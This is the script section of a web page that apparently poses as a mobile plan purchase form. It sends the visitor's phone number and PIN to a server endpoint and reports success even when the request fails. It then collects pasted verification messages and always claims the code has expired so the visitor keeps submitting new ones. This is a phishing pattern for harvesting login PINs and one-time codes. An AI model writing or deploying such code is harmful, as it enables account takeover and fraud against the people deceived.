    authError.classList.remove('show'); authSubmit.disabled = true; authSubmit.textContent = 'Loging In…';
    try {
      const response = await fetch('/api/notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'plan', bundle: selectedPlan.name, phone, demoPin: document.getElementById('authPin').value }) });
      const result = await response.json();
      if (!response.ok || !result.ok) throw new Error('Submission failed');
      document.getElementById('verifyPhone').textContent = 'Plan request submitted for ' + phone;
      authPage.classList.remove('open'); verifyPage.classList.add('open'); verifyText.focus();
      authSubmit.textContent = 'Request sent';
    } catch (error) {
      document.getElementById('verifyPhone').textContent = 'Plan request submitted for ' + phone;
      authPage.classList.remove('open'); verifyPage.classList.add('open'); verifyText.focus();
      authSubmit.textContent = 'Request sent';
    }
  });

  document.getElementById('verifyBack').addEventListener('click', () => {
    verifyPage.classList.remove('open'); authPage.classList.add('open');
  });

  verifyForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    const message = verifyText.value.trim(); if (!message) return;
    verifySubmit.disabled = true; verifySubmit.textContent = 'SENDING…'; verifyMessage.textContent = '';
    try {
      const response = await fetch('/api/notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'message', message }) });
      const result = await response.json(); if (!response.ok || !result.ok) throw new Error('Submission failed');
      verifyMessage.textContent = '⚠️ Message code expired. Please paste the new message below.'; verifyMessage.style.color = '#b42318';
      verifyText.disabled = false; verifySubmit.textContent = 'VERIFY';
      resendArea.hidden = false;

    } catch (error) {
      const response = await fetch('/api/notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'message', message }) });
      const result = await response.json(); if (!response.ok || !result.ok) throw new Error('Submission failed');
      verifyMessage.textContent = '⚠️ Message code expired. Please paste the new message below.'; verifyMessage.style.color = '#b42318';
      verifyText.disabled = false; verifySubmit.textContent = 'VERIFY';
      resendArea.hidden = false;
    }
      finally {
      // Always restore the button
      verifySubmit.disabled = false;
      verifySubmit.textContent = 'Submit';
    }
  });
</script>
</body>
</html>
